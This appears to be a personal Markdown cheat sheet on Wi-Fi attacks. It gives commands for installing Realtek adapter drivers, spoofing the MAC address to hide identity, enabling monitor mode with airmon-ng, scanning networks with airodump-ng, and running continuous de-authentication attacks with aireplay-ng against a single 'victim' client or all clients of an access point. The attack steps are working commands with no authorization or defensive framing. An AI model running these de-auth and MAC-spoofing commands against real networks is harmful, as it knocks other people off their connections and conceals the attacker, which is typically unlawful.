# WiFi hacking

## install REaltek drivers 

This is a typical wifi SOC within ALFA devices.


```bash
sudo apt install realtek-rtl88xxau-dkms
```

## Hide your Mac

```bash

sudo ip link set dev $interface down

sudo macchanger --mac=aa:bb:cc:dd:ee:ff $interface

sudo ip link set dev $interface up

```


## Put Wireless Interface in Monitor Mode

1. check for available interfaces

`airmon-ng check`

2. kill interfering processes

`airmon-ng check kill`

3. If interface is on `wlan0`, set it to monitoring mode

`airmon-ng start wlan0`

On success you get something like 

```
PHY	Interface	Driver		Chipset

phy0	wlan0		88XXau		Realtek Semiconductor Corp. RTL8812AU 802.11a/b/g/n/ac 2T2R DB WLAN Adapter
		(monitor mode enabled)

```

## Scanning for Networks


```bash

sudo airodump-ng --band abg $interface


#You can combine these to monitor multiple bands. For example:

#--band abg: Monitor all 2.4 GHz and 5 GHz networks.
#--band bg: Monitor only 2.4 GHz networks (both 802.11b and 802.11g).
#--band a: Monitor only 5 GHz networks.


```




This will display a list of all available Wi-Fi networks, along with various details about them:

```text
BSSID: The MAC address of the access point.
PWR: Signal level reported by the card.
Beacons: Number of announcements packets sent by the AP.
#Data: Number of captured data packets (includes data and QoS data).
CH: Channel on which the AP is operating.
ENC: Encryption algorithm used (WEP, WPA, WPA2, etc.).
ESSID: The name of the Wi-Fi network.
```



## De-auth attack

### single client

```bash

# you have to be monitoring specific BSSID on specific channel

sudo airodump-ng --bssid $AP_mac  -c $channel $interface


sudo aireplay-ng -0 0 -a $AP_mac -c $victim_mac $interface


# where -0 0 is continuous deauth mode

```

### multi clients

`sudo aireplay-ng -0 0 -a $AP_mac  $interface`
